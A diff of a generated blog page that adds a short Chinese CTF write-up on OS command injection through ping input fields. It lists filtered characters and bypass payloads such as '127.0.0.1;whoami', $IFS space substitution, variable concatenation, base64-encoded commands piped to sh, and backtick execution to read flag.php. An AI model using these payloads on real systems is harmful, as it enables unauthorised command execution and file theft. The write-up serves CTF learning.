@@ -15,7 +15,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>aaa |  Ymnnb</title>
+      <title> Ymnnb</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/1.ico" />
@@ -57,27 +57,74 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="page-"
-  class="article article-type-page"
+  id="post-CTF-ping"
+  class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  aaa
-</h1>
- 
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/CTF-ping/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.160Z" itemprop="datePublished">2024-07-29</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">474</span>
+        </span>
+    </span>
 
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">2 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
       
-    </header>
-       
+    <div class="tocbot"></div>
+
+
+
+
+  
     <div class="article-entry" itemprop="articleBody">
        
-   
+  <h1 id="CTF——ping相关"><a href="#CTF——ping相关" class="headerlink" title="CTF——ping相关"></a>CTF——ping相关</h1><p><strong>Ping</strong><br>PING （Packet Internet Groper），因特网包探索器，用于测试网络连接量的程序 。<br>Ping是工作在 TCP&#x2F;IP网络体系结构中应用层的一个服务命令， 主要是向特定的目的主机发送 ICMP（Internet Control Message Protocol 因特网报文控制协议）Echo 请求报文，测试目的站是否可达及了解其有关状态  。</p>
+<p><strong>检测是否可以注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;whoami</span><br><span class="line">如果存在注入，得到的结果是“www-data”</span><br></pre></td></tr></table></figure>
+
+<p><strong>ping 题目常过滤字符</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">‘$’								</span><br><span class="line">‘;’</span><br><span class="line">‘|’</span><br><span class="line">‘-’</span><br><span class="line">‘(’</span><br><span class="line">‘)’</span><br><span class="line">‘反引号’</span><br><span class="line">‘||’</span><br><span class="line">‘&amp;&amp;’</span><br><span class="line">‘&amp;’</span><br><span class="line">‘&#125;’</span><br><span class="line">‘&#123;’</span><br></pre></td></tr></table></figure>
+
+<p><strong>解决过滤</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;a=&quot;l&quot;;b=&quot;s&quot;;c=$a$b;$c(后面的部分可能会用引号包裹）</span><br></pre></td></tr></table></figure>
+
+<p><strong>针对空格过滤，可以使用：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;</span><br><span class="line">&lt; </span><br><span class="line">$IFS</span><br><span class="line">$IFS$9</span><br></pre></td></tr></table></figure>
+
+<p><strong>几种解题思路</strong></p>
+<h2 id="1、通过变量实现字符串拼接"><a href="#1、通过变量实现字符串拼接" class="headerlink" title="1、通过变量实现字符串拼接"></a>1、通过变量实现字符串拼接</h2><p>构造&#x2F;?ip&#x3D;127.0.0. 1;b&#x3D;ag;a&#x3D;fl;cat$lFS$1$a$b.php<br>注： 此处将变量ab的位置互换是为了绕过字符串匹配</p>
+<h2 id="2-通过执行sh命令来执行"><a href="#2-通过执行sh命令来执行" class="headerlink" title="2.通过执行sh命令来执行"></a>2.通过执行sh命令来执行</h2><p>(bash被过滤了，不然也可以执行)<br>构造&#x2F;?ip&#x3D;127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw| base64$IFS$1-d|sh<br>注：sh是linux中运行shell的命令， bash相当于sh的升级版，shebash</p>
+<p>使用 base64 编码的方式来绕过 flag 过滤。</p>
+<p>加密命令<br>echo “cat flag.php” | base64<br>解密命令并执行<br>echo Y2F0IGZsYWcucGhwCg&#x3D;&#x3D; | base64 -d | sh</p>
+<h2 id="3-内联执行"><a href="#3-内联执行" class="headerlink" title="3.内联执行"></a>3.内联执行</h2><p>构造&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$9’ls<br>注：内联， 就是将反引号内命令的输出作为输入执行。</p>
+<p>内联函数：将指定的函数体插入并取代每一处调用该函数的地方。</p>
+<p>反引号在linux中作为内联执行，执行输出结果。也就是说</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat `ls`</span><br><span class="line">//执行ls输出 index.php 和 flag.php 。然后再执行 cat flag.php;cat index.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p>构造payload &#x2F;?ip&#x3D;127.0.0.1;cat$IFS$9<code>ls</code></p>
+ 
       <!-- reward -->
       
     </div>
@@ -141,7 +188,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/aaa/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/07/29/CTF-ping/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -150,9 +197,37 @@
   </div>
 
    
+  <nav class="article-nav">
+    
+      <a href="/2024/07/29/DHCP/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            (no title)
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2024/07/29/%C3%9764%C3%9786/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title"></div>
+      </a>
+    
+  </nav>
+
   
    
   
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
 </article>
 
 </section>
@@ -283,6 +358,22 @@
 <script src="/js/lazyload.min.js"></script>
 
 <!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
 
 <script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
 <link
